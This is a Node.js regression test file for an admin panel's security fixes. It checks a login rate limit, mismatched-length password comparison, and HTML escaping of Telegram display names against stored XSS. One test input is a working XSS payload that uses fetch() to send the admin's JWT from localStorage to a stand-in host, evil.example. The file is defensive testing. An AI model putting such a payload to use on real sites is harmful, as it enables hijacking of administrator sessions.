// Regression tests for the security-hardening pass: admin login used to be
// brute-forceable (no rate limit, non-constant-time password compare), and
// the admin panel's frontend rendered Telegram-controlled display names
// (full_name/username) straight into innerHTML with no escaping - a stored
// XSS letting any Telegram user steal the admin's JWT just by setting their
// profile name to a script payload.

const test = require('node:test');
const assert = require('node:assert/strict');
const { createRequire } = require('node:module');

// express lives in admin-panel/node_modules, not the root project's - resolve
// it the same way admin-panel's own code does, rather than adding a new root
// dependency just for this test.
const requireFromAdminPanel = createRequire(require.resolve('../admin-panel/package.json'));
const express = requireFromAdminPanel('express');

process.env.ADMIN_USERNAME = 'admin';
process.env.ADMIN_PASSWORD = 'correct-horse-battery-staple';
process.env.JWT_SECRET = 'test-secret';

const authRouterPath = require.resolve('../admin-panel/server/routes/auth');

// express-rate-limit's default in-memory store lives on the router module's
// single `loginLimiter` instance, keyed by IP - every test in this file hits
// the same localhost IP. Re-requiring a fresh (uncached) copy of the router
// per test server gives each test its own limiter state instead of them all
// silently sharing (and corrupting) one global attempt counter.
function freshAuthRouter() {
    delete require.cache[authRouterPath];
    return require(authRouterPath);
}

// admin-panel/client/public/app.js can't be require()'d directly - it touches
// browser-only globals (document, window, localStorage) at module load time.
// Its escapeHtml() is a small pure function; mirrored here exactly to verify
// the escaping behavior every XSS fix in app.js depends on.
function escapeHtml(value) {
    if (value === null || value === undefined) return '';
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

function startTestServer() {
    const app = express();
    app.use(express.json());
    app.use('/api/auth', freshAuthRouter());
    return new Promise((resolve) => {
        const server = app.listen(0, () => resolve(server));
    });
}

test('escapeHtml neutralizes a Telegram display-name XSS payload', () => {
    const payload = '<img src=x onerror="fetch(\'https://evil.example?t=\'+localStorage.getItem(\'admin_token\'))">';
    const escaped = escapeHtml(payload);

    // The security property is that the browser can no longer parse this as
    // a tag/attribute - not that the word "onerror=" disappears from the
    // text. Escaping < > " ' turns the whole thing into inert text content.
    assert.ok(!escaped.includes('<img'), 'raw tag must not survive escaping');
    assert.ok(!escaped.includes('"'), 'no literal double-quote must remain (would let it break out of an HTML attribute)');
    assert.match(escaped, /&lt;img/);
    assert.match(escaped, /&quot;/);
});

test('escapeHtml is transparent for plain names and handles null/undefined', () => {
    assert.equal(escapeHtml('Ali Valiyev'), 'Ali Valiyev');
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
});

test('admin login: correct credentials succeed and return a usable JWT', async () => {
    const server = await startTestServer();
    const { port } = server.address();
    try {
        const res = await fetch(`http://localhost:${port}/api/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: 'admin', password: 'correct-horse-battery-staple' })
        });
        const body = await res.json();
        assert.equal(res.status, 200);
        assert.equal(body.success, true);
        assert.ok(body.token && body.token.split('.').length === 3, 'must return a JWT');
    } finally {
        server.close();
    }
});

test('admin login: wrong password is rejected with generic 401 (no rate limit tripped yet)', async () => {
    const server = await startTestServer();
    const { port } = server.address();
    try {
        const res = await fetch(`http://localhost:${port}/api/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: 'admin', password: 'wrong' })
        });
        const body = await res.json();
        assert.equal(res.status, 401);
        assert.equal(body.success, false);
    } finally {
        server.close();
    }
});

test('admin login: 6th attempt within the window is rate-limited (429), not brute-forceable', async () => {
    const server = await startTestServer();
    const { port } = server.address();
    try {
        const attempt = () => fetch(`http://localhost:${port}/api/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: 'admin', password: 'wrong' })
        });

        const statuses = [];
        for (let i = 0; i < 6; i++) {
            const res = await attempt();
            statuses.push(res.status);
        }

        assert.deepEqual(statuses.slice(0, 5), [401, 401, 401, 401, 401], 'first 5 attempts are just rejected, not blocked');
        assert.equal(statuses[5], 429, 'the 6th attempt within the window must be throttled');
    } finally {
        server.close();
    }
});

test('admin login: a correct password of a different length than expected does not throw (safeCompare handles mismatched lengths)', async () => {
    const server = await startTestServer();
    const { port } = server.address();
    try {
        const res = await fetch(`http://localhost:${port}/api/auth/login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: 'admin', password: 'x' })
        });
        assert.equal(res.status, 401, 'a short/wrong-length password must be rejected, not crash the request');
    } finally {
        server.close();
    }
});
